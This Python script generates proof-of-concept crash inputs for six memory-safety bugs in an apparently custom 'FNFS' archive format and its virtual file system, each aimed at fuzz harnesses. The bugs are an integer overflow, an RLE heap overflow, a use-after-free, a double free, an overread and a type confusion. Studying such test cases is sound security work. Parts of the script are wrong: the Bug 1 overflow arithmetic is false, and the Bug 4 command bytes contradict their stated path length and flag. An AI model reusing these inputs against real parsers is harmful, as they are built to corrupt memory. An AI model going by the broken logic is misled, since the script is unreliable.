import struct
import os

def write_poc_file(filename, data):
    os.makedirs("pocs", exist_ok=True)
    path = os.path.join("pocs", filename)
    with open(path, "wb") as f:
        f.write(data)
    print(f"Generated: {path}")

# ==========================================
# Bug 1: Integer Overflow in Directory Allocation
# ==========================================
def make_poc_bug1():
    # num_files = 0x05aaaaab (95066795)
    # total_dir_size = 95066795 * 49 = 4658272955 (wraps to 16 in 32-bit uint)
    magic = b"FNFS"
    num_files = 0x05aaaaab
    dir_offset = 12
    header = struct.pack("<4sII", magic, num_files, dir_offset)
    
    # We write 3 real entries to overflow the 16-byte allocated buffer
    entry_data = b""
    for i in range(3):
        fname = f"file{i}.bin".encode().ljust(32, b'\x00')
        entry = struct.pack("<32sIIIbI", fname, 10, 10, 12, 0, 0)
        entry_data += entry
        
    return header + entry_data

# ==========================================
# Bug 2: RLE Out-of-Bounds Write (Decompression)
# ==========================================
def make_poc_bug2():
    magic = b"FNFS"
    num_files = 1
    dir_offset = 12 + 12 # Header (12) + compressed file data (12)
    header = struct.pack("<4sII", magic, num_files, dir_offset)
    
    # RLE data: count=255, val='A'. Decompress writes 255 bytes into a 12-byte buffer.
    rle_data = struct.pack("Bc", 255, b'A')
    rle_data = rle_data.ljust(12, b'\x00')
    
    fname = b"file.bin".ljust(32, b'\x00')
    entry = struct.pack("<32sIIIbI", fname, len(rle_data), 12, 12, 1, 0) # compression=1
    
    return header + rle_data + entry

# ==========================================
# Bug 3: Use-After-Free (Stateful VFS commands)
# ==========================================
def make_poc_bug3():
    # Target harness: fuzz_vfs
    # We want: 
    # 1. Mount archive (first half of data) - let's make it a tiny valid archive
    # 2. Command sequence (second half of data)
    # Commands format:
    # byte 0: op. op % 4 == 0 -> Open file.
    #   next byte: path_len
    #   path_len bytes: path characters
    #   next byte: double flag
    # byte N: op. op % 4 == 2 -> Delete file.
    #   next byte: path_len
    #   path_len bytes: path characters
    #   next byte: double flag
    # byte M: op. op % 4 == 1 -> Read file.
    #   next byte: fd_idx (will read from open FDs)
    
    # Part 1: Valid Archive with "test"
    magic = b"FNFS"
    num_files = 1
    dir_offset = 12 + 10 # Header + file data (10 bytes)
    header = struct.pack("<4sII", magic, num_files, dir_offset)
    file_data = b"1234567890"
    fname = b"test".ljust(32, b'\x00')
    entry = struct.pack("<32sIIIbI", fname, 10, 10, 12, 0, 0)
    archive = header + file_data + entry
    
    # Padding archive to half-size (say 100 bytes)
    archive = archive.ljust(100, b'\x00')
    
    # Part 2: Commands
    # Command 1: Open "/test" (op=0)
    #   path_len = 4
    #   chars = 't', 'e', 's', 't'
    #   double_flag = 0
    cmd_open = struct.pack("BBBBBBB", 0, 4, ord('t'), ord('e'), ord('s'), ord('t'), 0)
    
    # Command 2: Delete "/test" (op=2)
    #   path_len = 4
    #   chars = 't', 'e', 's', 't'
    #   double_flag = 0
    cmd_delete = struct.pack("BBBBBBB", 2, 4, ord('t'), ord('e'), ord('s'), ord('t'), 0)
    
    # Command 3: Read (op=1)
    #   fd_idx = 0
    cmd_read = struct.pack("BB", 1, 0)
    
    commands = cmd_open + cmd_delete + cmd_read
    return archive + commands

# ==========================================
# Bug 4: Double Free Cache Eviction
# ==========================================
def make_poc_bug4():
    # Target harness: fuzz_vfs
    # Cache capacity is 3. We open 4 files whose paths contain "double".
    # This triggers eviction of the first, which is freed but stays in cache_map.
    # Then we trigger clear_cache (op=3) which deletes it again.
    
    # Part 1: Archive containing files a, b, c, d (all ending in double)
    magic = b"FNFS"
    num_files = 4
    dir_offset = 12 + 40
    header = struct.pack("<4sII", magic, num_files, dir_offset)
    file_data = b"0123456789" * 4 # 40 bytes
    
    entries = b""
    for name in [b"adouble", b"bdouble", b"cdouble", b"ddouble"]:
        fname = name.ljust(32, b'\x00')
        entry = struct.pack("<32sIIIbI", fname, 10, 10, 12, 0, 0)
        entries += entry
    archive = header + file_data + entries
    archive = archive.ljust(300, b'\x00')
    
    # Part 2: Commands
    # Open "adouble" (op=0, double_flag=1 (odd value in op/bytes))
    cmd1 = struct.pack("BBBBBBBB", 0, 7, ord('a'), ord('d'), ord('o'), ord('u'), ord('b'), 0)
    # Open "bdouble"
    cmd2 = struct.pack("BBBBBBBB", 0, 7, ord('b'), ord('d'), ord('o'), ord('u'), ord('b'), 0)
    # Open "cdouble"
    cmd3 = struct.pack("BBBBBBBB", 0, 7, ord('c'), ord('d'), ord('o'), ord('u'), ord('b'), 0)
    # Open "ddouble" (evicts adouble, which gets freed but remains in map)
    cmd4 = struct.pack("BBBBBBBB", 0, 7, ord('d'), ord('d'), ord('o'), ord('u'), ord('b'), 0)
    # Clear Cache (op=3)
    cmd5 = struct.pack("B", 3)
    
    commands = cmd1 + cmd2 + cmd3 + cmd4 + cmd5
    return archive + commands

# ==========================================
# Bug 5: Heap Buffer Overread (Unterminated name)
# ==========================================
def make_poc_bug5():
    magic = b"FNFS"
    num_files = 1
    dir_offset = 12
    header = struct.pack("<4sII", magic, num_files, dir_offset)
    
    # filename is exactly 32 bytes without null-terminator.
    # The fuzzer reads it and searches for null-terminator beyond.
    fname = b"A" * 32
    entry = struct.pack("<32sIIIbI", fname, 10, 10, 12, 0, 0)
    
    return header + entry

# ==========================================
# Bug 6: Type Confusion
# ==========================================
def make_poc_bug6():
    # Target: fuzz_mount (or fuzz_vfs)
    # We mount an archive with a directory entry whose name ends with ".raw".
    # Wait, in the VFS mount logic, all archive entries are mounted as FileNodes!
    # But wait, how do we get a DirectoryNode?
    # Ah! If we create a directory node implicitly via parent paths:
    # E.g. filename "foo.raw/bar" is processed:
    # 1. Splits "foo.raw/bar" by '/' -> creates DirectoryNode named "foo.raw".
    # 2. Creates FileNode named "bar" inside "foo.raw".
    # When we call vfs.open_file("/foo.raw"), it looks up "/foo.raw" and returns the DirectoryNode!
    # If the filename contains ".raw", open_file succeeds.
    # Then read_file(fd) is called. In read_file, since node->name ("foo.raw") contains ".raw",
    # it bypasses type check and casts DirectoryNode to FileNode -> TYPE CONFUSION!
    
    magic = b"FNFS"
    num_files = 1
    dir_offset = 12 + 10
    header = struct.pack("<4sII", magic, num_files, dir_offset)
    file_data = b"1234567890"
    
    # Filename contains directory nesting: "foo.raw/bar"
    fname = b"foo.raw/bar".ljust(32, b'\x00')
    entry = struct.pack("<32sIIIbI", fname, 10, 10, 12, 0, 0)
    
    return header + file_data + entry

if __name__ == "__main__":
    write_poc_file("poc_bug1.bin", make_poc_bug1())
    write_poc_file("poc_bug2.bin", make_poc_bug2())
    write_poc_file("poc_bug3.bin", make_poc_bug3())
    write_poc_file("poc_bug4.bin", make_poc_bug4())
    write_poc_file("poc_bug5.bin", make_poc_bug5())
    write_poc_file("poc_bug6.bin", make_poc_bug6())
